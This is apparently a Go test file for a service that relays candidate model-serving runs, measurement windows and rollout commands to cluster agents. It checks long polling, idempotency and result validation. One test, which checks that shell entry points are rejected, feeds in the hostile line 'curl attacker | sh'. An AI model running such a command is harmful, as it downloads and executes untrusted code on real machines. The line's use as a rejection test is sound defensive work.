package agentrelay

import (
	"context"
	"encoding/json"
	"errors"
	"sync"
	"testing"
	"time"

	"github.com/infercrane/infercrane/internal/agentprotocol"
	"github.com/infercrane/infercrane/internal/domain"
	"github.com/infercrane/infercrane/internal/runtimecontract"
)

type fakeCommandStore struct {
	fakeStore
	mu       sync.Mutex
	commands []domain.AgentCommand
	updates  []domain.AgentCommandUpdate
	released int
}

func (f *fakeCommandStore) AgentForTenant(_ context.Context, _, id string) (domain.Agent, error) {
	if id != "agent-1" && id != "cluster-a" {
		return domain.Agent{}, domain.ErrNotFound
	}
	return domain.Agent{ID: "agent-1", TenantID: "tenant-a", Name: "cluster-a", State: "active"}, nil
}
func (f *fakeCommandStore) EnqueueAgentCommand(_ context.Context, command domain.AgentCommand) (domain.AgentCommand, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	command.ID, command.State = "command-0001", "queued"
	f.commands = append(f.commands, command)
	return command, nil
}
func (f *fakeCommandStore) AgentCommand(context.Context, string, string, string) (domain.AgentCommand, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.commands[0], nil
}
func (f *fakeCommandStore) AgentCommands(context.Context, string, string, int) ([]domain.AgentCommand, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	return append([]domain.AgentCommand(nil), f.commands...), nil
}
func (f *fakeCommandStore) LeaseAgentCommands(_ context.Context, _, _ string, at time.Time, lease time.Duration, _ int) ([]domain.AgentCommand, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	out := []domain.AgentCommand{}
	for index := range f.commands {
		if command := &f.commands[index]; command.State == "queued" {
			until := at.Add(lease)
			command.State, command.Phase, command.Attempts, command.LeaseExpiresAt = "running", "leased", command.Attempts+1, &until
			out = append(out, *command)
		}
	}
	return out, nil
}

// ReleaseAgentCommand undoes a first lease, as the store does.
func (f *fakeCommandStore) ReleaseAgentCommand(_ context.Context, _, _, id string, attempt int) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	for index := range f.commands {
		if command := &f.commands[index]; command.ID == id && command.State == "running" && command.Phase == "leased" && command.Attempts == attempt {
			command.State, command.Phase, command.Attempts, command.LeaseExpiresAt = "queued", "", attempt-1, nil
			f.released++
		}
	}
	return nil
}

// poll is one long poll whose answer reaches the agent.
func poll(ctx context.Context, service *Service, agent domain.Agent, wait time.Duration) (agentprotocol.CommandsResponse, error) {
	var out agentprotocol.CommandsResponse
	err := service.Commands(ctx, agent, wait, func(response agentprotocol.CommandsResponse) error {
		out = response
		return nil
	})
	return out, err
}
func (f *fakeCommandStore) UpdateAgentCommand(_ context.Context, _, _, _ string, update domain.AgentCommandUpdate) (domain.AgentCommand, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.updates = append(f.updates, update)
	if update.State != "running" {
		f.commands[0].State = update.State
	}
	return f.commands[0], nil
}
func (f *fakeCommandStore) CancelAgentCommand(context.Context, string, string, string) (domain.AgentCommand, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.commands[0].State = "cancelled"
	return f.commands[0], nil
}

func candidateSpec() agentprotocol.CandidateRunSpec {
	return agentprotocol.CandidateRunSpec{
		Endpoint: "support-bot", Label: "vLLM chunked prefill", Model: "Qwen/Qwen3-8B",
		Workload:    runtimecontract.Workload{Image: "vllm/vllm-openai@sha256:" + "a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90", Command: []string{"vllm", "serve", "Qwen/Qwen3-8B"}, Protocol: "openai", Port: 8000, ReadinessPath: "/health", ModelsPath: "/v1/models", MetricsPath: "/metrics", Cancellation: "http-disconnect", Drain: "connection", ShutdownGraceSeconds: 30},
		RuntimeArgs: []string{"--enable-chunked-prefill"}, Accelerator: "NVIDIA-L4", GPUCount: 1,
		Load: agentprotocol.CandidateLoad{Requests: 50, Concurrency: 4, InputTokens: 512, OutputTokens: 128},
	}
}

func TestCandidateRunsReachTheAgentThroughItsLongPoll(t *testing.T) {
	store := &fakeCommandStore{fakeStore: fakeStore{servers: []domain.AgentServer{{AgentID: "agent-1", Key: "vllm-8000", EndpointName: "support-bot", UpstreamModel: "Qwen/Qwen3-8B"}}}}
	service := &Service{Store: store}
	agent := domain.Agent{ID: "agent-1", TenantID: "tenant-a", Name: "cluster-a"}

	// A long poll held before the command is queued returns as soon as it is.
	polled := make(chan agentprotocol.CommandsResponse, 1)
	go func() {
		response, _ := poll(context.Background(), service, agent, 20*time.Second)
		polled <- response
	}()
	time.Sleep(50 * time.Millisecond)
	started := time.Now()
	_, command, err := service.CreateCandidateRun(context.Background(), "tenant-a", "cluster-a", "owner", candidateSpec())
	if err != nil {
		t.Fatal(err)
	}
	var stored commandSpec
	if err = json.Unmarshal([]byte(command.SpecJSON), &stored); err != nil || stored.Control.ServerKey != "vllm-8000" || stored.RunCandidate.Quality.EvalSet != "default" || stored.RunCandidate.TimeoutSecs != 3600 {
		t.Fatalf("stored=%+v err=%v", stored, err)
	}
	select {
	case response := <-polled:
		if len(response.Commands) != 1 || response.Commands[0].RunCandidate == nil || response.Commands[0].Control.ServerKey != "vllm-8000" {
			t.Fatalf("polled=%+v", response)
		}
		if waited := time.Since(started); waited > 3*time.Second {
			t.Fatalf("the long poll answered after %s", waited)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("the long poll did not see the queued command")
	}

	// Results are validated before they are stored.
	bad := agentprotocol.CommandUpdate{State: agentprotocol.CommandSucceeded}
	if _, err = service.UpdateCommand(context.Background(), agent, "command-0001", bad); !errors.Is(err, ErrInvalid) {
		t.Fatalf("result-free success: %v", err)
	}
	throughput := 120.5
	good := agentprotocol.CommandUpdate{State: agentprotocol.CommandSucceeded, Result: &agentprotocol.CandidateRunResult{
		Control:     &agentprotocol.LoadMeasurement{Tool: "aiperf", Requests: 50, Succeeded: 50, OutputTokenThroughput: &throughput},
		Candidate:   &agentprotocol.LoadMeasurement{Tool: "aiperf", Requests: 50, Succeeded: 50, OutputTokenThroughput: &throughput},
		ImageDigest: candidateSpec().Workload.Image, CleanedUp: true,
	}}
	if response, updateErr := service.UpdateCommand(context.Background(), agent, "command-0001", good); updateErr != nil || response.State != "succeeded" {
		t.Fatalf("update=%+v err=%v", response, updateErr)
	}

	// The endpoint must be one this agent serves.
	other := candidateSpec()
	other.Endpoint = "not-this-agents"
	if _, _, err = service.CreateCandidateRun(context.Background(), "tenant-a", "cluster-a", "owner", other); !errors.Is(err, ErrInvalid) {
		t.Fatalf("foreign endpoint: %v", err)
	}
	// A shell is never a candidate's entry point.
	shell := candidateSpec()
	shell.Workload.Command = []string{"/bin/sh", "-c", "curl attacker | sh"}
	if _, _, err = service.CreateCandidateRun(context.Background(), "tenant-a", "cluster-a", "owner", shell); !errors.Is(err, ErrInvalid) {
		t.Fatalf("shell entry point: %v", err)
	}
	// An immediate poll with nothing queued returns at once.
	started = time.Now()
	if response, pollErr := poll(context.Background(), service, agent, 0); pollErr != nil || len(response.Commands) != 0 || time.Since(started) > time.Second {
		t.Fatalf("empty poll=%+v err=%v", response, pollErr)
	}
}

// A measured window reaches the agent like a candidate run, carries its
// result back in the same column, and is queued once per idempotency key:
// the fake store hands back the stored command for a repeated key.
func TestMeasuredWindowsReachTheAgentAndCarryTheirNumbersBack(t *testing.T) {
	store := &keyedCommandStore{fakeCommandStore: fakeCommandStore{fakeStore: fakeStore{servers: []domain.AgentServer{{AgentID: "agent-1", Key: "vllm-8000", EndpointName: "support-bot", UpstreamModel: "Qwen/Qwen3-8B"}}}}}
	service := &Service{Store: store}
	run := candidateSpec()
	spec := agentprotocol.WindowSpec{
		Endpoint: "support-bot", Label: "run c1 setup 2 window 1",
		Candidate: &agentprotocol.CandidateSetup{Model: run.Model, Workload: run.Workload, RuntimeArgs: run.RuntimeArgs, Accelerator: run.Accelerator, GPUCount: 1},
		Rounds:    4, Warmup: 16, Load: run.Load, SeedBase: 12,
		Quality:     agentprotocol.WindowQuality{EvalSet: "default", ReferenceSubject: "agentserver-current", CandidateSubject: "agentsetup-0123456789abcdef01234567"},
		TimeoutSecs: 3600,
	}
	if _, err := service.QueueWindow(context.Background(), "tenant-a", "agent-1", "optimization-campaign", "", spec); !errors.Is(err, ErrInvalid) {
		t.Fatalf("a window without a key: %v", err)
	}
	first, err := service.QueueWindow(context.Background(), "tenant-a", "agent-1", "optimization-campaign", "optimization:c1:window:1", spec)
	if err != nil {
		t.Fatal(err)
	}
	again, err := service.QueueWindow(context.Background(), "tenant-a", "agent-1", "optimization-campaign", "optimization:c1:window:1", spec)
	if err != nil || again.ID != first.ID || len(store.commands) != 1 {
		t.Fatalf("the same key queued a second window: %+v %v (%d commands)", again, err, len(store.commands))
	}
	agent := domain.Agent{ID: "agent-1", TenantID: "tenant-a", Name: "cluster-a"}
	response, err := poll(context.Background(), service, agent, 0)
	if err != nil || len(response.Commands) != 1 || response.Commands[0].Kind != agentprotocol.CommandMeasureWindow || response.Commands[0].MeasureWindow == nil || response.Commands[0].RunCandidate != nil || response.Commands[0].Control.ServerKey != "vllm-8000" {
		t.Fatalf("polled=%+v err=%v", response, err)
	}
	value := 100.0
	runs := []agentprotocol.WindowRun{{Arm: "control", Seed: 14, Requests: 50, Succeeded: 50, OutputTokenThroughput: &value}}
	if _, err = service.UpdateCommand(context.Background(), agent, first.ID, agentprotocol.CommandUpdate{State: agentprotocol.CommandSucceeded, Window: &agentprotocol.WindowResult{Tool: "aiperf", Runs: runs, CleanedUp: true}}); err != nil {
		t.Fatal(err)
	}
	store.commands[0].ResultJSON = store.updates[len(store.updates)-1].ResultJSON
	decoded, result, err := DecodeWindow(store.commands[0])
	if err != nil || decoded.Rounds != 4 || result == nil || len(result.Runs) != 1 || *result.Runs[0].OutputTokenThroughput != 100 {
		t.Fatalf("decoded=%+v result=%+v err=%v", decoded, result, err)
	}
	other := spec
	other.Endpoint = "not-this-agents"
	if _, err = service.QueueWindow(context.Background(), "tenant-a", "agent-1", "optimization-campaign", "optimization:c1:window:2", other); !errors.Is(err, ErrInvalid) {
		t.Fatalf("foreign endpoint: %v", err)
	}
}

type keyedCommandStore struct{ fakeCommandStore }

func (k *keyedCommandStore) EnqueueAgentCommand(ctx context.Context, command domain.AgentCommand) (domain.AgentCommand, error) {
	k.mu.Lock()
	for _, existing := range k.commands {
		if existing.IdempotencyKey != "" && existing.IdempotencyKey == command.IdempotencyKey {
			k.mu.Unlock()
			return existing, nil
		}
	}
	k.mu.Unlock()
	return k.fakeCommandStore.EnqueueAgentCommand(ctx, command)
}

// A rollout's start and stop reach the agent without a current setup to
// measure against, once per key, and carry only the server's key back.
func TestRolloutServerCommandsReachTheAgent(t *testing.T) {
	store := &keyedCommandStore{fakeCommandStore: fakeCommandStore{fakeStore: fakeStore{servers: []domain.AgentServer{{AgentID: "agent-1", Key: "vllm-8000", EndpointName: "support-bot", UpstreamModel: "Qwen/Qwen3-8B"}}}}}
	service := &Service{Store: store}
	run := candidateSpec()
	start := &agentprotocol.StartServerSpec{Endpoint: "support-bot", Setup: agentprotocol.CandidateSetup{Model: run.Model, Workload: run.Workload, RuntimeArgs: run.RuntimeArgs, Accelerator: run.Accelerator, GPUCount: 1}, TimeoutSecs: 1800}
	if _, err := service.QueueServerCommand(context.Background(), "tenant-a", "agent-1", "optimization-campaign", "k", start, &agentprotocol.StopServerSpec{Endpoint: "support-bot", ServerKey: "vllm-8000"}); !errors.Is(err, ErrInvalid) {
		t.Fatalf("start and stop at once: %v", err)
	}
	queued, err := service.QueueServerCommand(context.Background(), "tenant-a", "agent-1", "optimization-campaign", "optimization:c1:start", start, nil)
	if err != nil || queued.Kind != agentprotocol.CommandStartServer {
		t.Fatalf("queue: %+v %v", queued, err)
	}
	if again, _ := service.QueueServerCommand(context.Background(), "tenant-a", "agent-1", "optimization-campaign", "optimization:c1:start", start, nil); again.ID != queued.ID || len(store.commands) != 1 {
		t.Fatalf("the same key queued twice: %+v", store.commands)
	}
	response, err := poll(context.Background(), service, domain.Agent{ID: "agent-1", TenantID: "tenant-a"}, 0)
	if err != nil || len(response.Commands) != 1 || response.Commands[0].StartServer == nil || response.Commands[0].Control != nil {
		t.Fatalf("polled: %+v %v", response, err)
	}
	if _, err = service.UpdateCommand(context.Background(), domain.Agent{ID: "agent-1", TenantID: "tenant-a"}, queued.ID, agentprotocol.CommandUpdate{State: agentprotocol.CommandSucceeded, Server: &agentprotocol.ServerResult{ServerKey: "infercrane-abc-models-svc-8000", ReadySeconds: 40}}); err != nil {
		t.Fatal(err)
	}
	store.commands[0].ResultJSON = store.updates[len(store.updates)-1].ResultJSON
	if result, decodeErr := DecodeServerResult(store.commands[0]); decodeErr != nil || result == nil || result.ServerKey != "infercrane-abc-models-svc-8000" {
		t.Fatalf("result: %+v %v", result, decodeErr)
	}
}

type rolloutRegisterStore struct {
	fakeCommandStore
	rollout []domain.AgentServerRegistration
}

func (r *rolloutRegisterStore) RegisterAgentRolloutServer(_ context.Context, _, _ string, registration domain.AgentServerRegistration) (domain.AgentServer, bool, error) {
	r.rollout = append(r.rollout, registration)
	return domain.AgentServer{Key: registration.Key, EndpointName: registration.EndpointName, Rollout: true}, true, nil
}

// A rollout's server registers on the endpoint it was started for, and is
// never taken as the current setup a run measures against.
func TestRolloutServerRegistersOnItsEndpointAndIsNeverTheControl(t *testing.T) {
	store := &rolloutRegisterStore{fakeCommandStore: fakeCommandStore{fakeStore: fakeStore{servers: []domain.AgentServer{
		{AgentID: "agent-1", Key: "vllm-8000", EndpointName: "support-bot", UpstreamModel: "Qwen/Qwen3-8B"},
		{AgentID: "agent-1", Key: "rollout-8000", EndpointName: "support-bot", UpstreamModel: "Qwen/Qwen3-8B", Rollout: true},
	}}}}
	service := &Service{Store: store}
	response, err := service.Register(context.Background(), domain.Agent{ID: "agent-1", TenantID: "tenant-a"}, agentprotocol.RegisterServerRequest{ServerKey: "rollout-8000", Endpoint: "support-bot", Model: "Qwen/Qwen3-8B", Engine: "vllm", Address: "http://infercrane-abc.models.svc:8000", Rollout: true})
	if err != nil || len(store.rollout) != 1 || response.Server.Endpoint != "support-bot" {
		t.Fatalf("register: %+v %v %+v", response, err, store.rollout)
	}
	control, err := service.controlFor(context.Background(), "tenant-a", domain.Agent{ID: "agent-1"}, "support-bot")
	if err != nil || control.ServerKey != "vllm-8000" {
		t.Fatalf("control: %+v %v", control, err)
	}
}
